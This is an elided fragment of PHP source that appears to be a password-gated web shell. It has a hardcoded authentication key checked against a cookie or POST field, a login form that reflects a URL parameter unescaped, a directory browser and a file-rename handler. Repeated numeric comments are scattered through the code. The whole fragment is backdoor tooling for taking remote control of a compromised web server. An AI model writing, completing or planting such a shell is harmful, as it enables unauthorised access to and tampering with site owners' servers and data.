...
$auth_key = "df7f9ca897ea419ed219ce8b97c68466";
...
$pass = false;
if (isset($_COOKIE['pw_name_80908'])) {
    if(($_COOKIE['pw_name_80908']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_80908'])) {
        if(($_POST['pw_name_80908']) == $auth_key) {
            setcookie("pw_name_80908", $_POST['pw_name_80908']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_80908' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1726249863505255 1726249863836857 1726249863326318 1726249863813713
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1726249863505255 1726249863836857 1726249863326318 1726249863813713
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1726249863505255 1726249863836857 1726249863326318 1726249863813713
            $name = PATH . "/" . $_GET['r'];
